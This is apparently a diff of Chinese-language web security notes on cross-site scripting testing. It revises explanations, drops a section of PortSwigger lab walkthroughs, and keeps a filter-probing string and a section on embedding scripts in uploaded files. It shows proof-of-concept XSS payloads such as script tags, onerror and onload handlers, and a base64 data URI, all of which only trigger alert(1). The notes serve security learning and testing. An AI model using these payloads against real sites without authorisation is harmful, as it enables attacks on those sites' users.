@@ -2,29 +2,29 @@
 
 > 只可作用于触发 XSS 的网站, 如: 
 >
-> 在 example.com 上传 PDF-XSS, 打开时会调用 test.com 提供的 PDF 查看器并触发 XSS;
+> 在 example.com 上传 HTML-XSS, 打开时会调用 test.com 提供的 HTML 解析器并触发 XSS;
 >
 > 那么此时的 XSS 只作用于 test.com, 不会影响 example.com.
 
+Reflected XSS 和 DOM XSS 危害和影响较小, 建议只测试 Stored XSS;
+
 ## 1. 原理
 
-当我搜索 test 时
+当我搜索 test 时, 服务器会将我输入的字符处理后返回到浏览器
 
 ```
 GET /?search=test HTTP/2
 Host: web-security-academy.net
 ```
 
-后端会将我输入的字符处理后返回到前端
-
 ```
-<h1>1 search results for 'test'</h1>
+<h1>1 search results for "test"</h1>
 ```
 
-若我搜索的内容是一段 XSS, 那么前端就会执行
+若我搜索的内容是一段 XSS, 那么就会在浏览器执行
 
 ```
-<h1>0 search results for '<script>alert(1)</script>'</h1>
+<h1>0 search results for ""<script>alert(1)</script>"</h1>
 ```
 
 ### 1.1 常用执行函数
@@ -50,88 +50,21 @@ onmouseup="alert(1)"	# 鼠标松开时触发
 onfocus="alert(1)"	    # 元素获得焦点时触发（如 <input>）
 ```
 
-## 2. 插入式 XSS
+## 2. 数据提交类
 
-### 2.1. [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
-
-查看前端代码
-
-```
-<h1>1 search results for 'test'</h1>
-```
-
-后端未对传入的字符进行任何处理
-
-```
-<script>alert(1)</script>
-```
-
-### 2.2. [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
-
-查看前端代码
-
-```
-<p>test</p>
-```
-
-后端未对传入的字符进行任何处理
-
-```
-<script>alert(1)</script>
-```
-
-### 2.3. [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
-
-查看前端代码
-
-```
-<h1>3 search results for 'test'</h1>
-```
-
-后端对传入的特殊字符进行 HTML 转义
-
-```
-<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
-```
+在目标网站提交使用 XSS 构造的数据
 
 提交这个字符串可以判断过滤了哪些字符，有的字符只可在 IE 中使用
 
 ```
-xss"""'''```＜<>＞.,:;onmousemovejavascriptstyle(1)
+xss"""'''```<>＜＞.,:;onmousemovejavascriptstyle(1)
 ```
 
-```
-<h1>0 search results for 'xss"""'\`&gt;,:;onmousemovejavascriptstyle(1)'</h1>
-```
+### 2.1. 案例
 
-可以看到特殊字符被转义, 可是在另一个位置返回以下前端代码, 怀疑存在 DOM XSS
+- [使用全角尖括号绕过](https://hackerone.com/reports/639684)
 
-```
-<img src="/resources/images/tracker.gif?searchTerms=xss" ""'`="">
-,:;onmousemovejavascriptstyle(1)"&gt; 
-```
-
-简化这段前端代码
-
-```
-<img src="/resources/images/tracker.gif?searchTerms=">
-```
-
-由于这段代码处于 `<img>` 标签中, 可通过插入事件触发
-
-```
-xss" onerror="alert(1)"
-```
-
-或者通过闭合 `<img>` 标签触发
-
-```
-"><img src="x" onerror="alert(1)">
-"><svg onload=alert(1)>
-"><script>alert(1)</script>
-```
-
-## 3. 嵌入式 XSS
+## 3. 文件解析类
 
 在文件中嵌入恶意脚本后上传, 当目标加载文件时会触发 XSS 攻击.
 
@@ -179,8 +112,6 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ```
 
 ---
-
-参考链接
 
 - [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
 - [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)
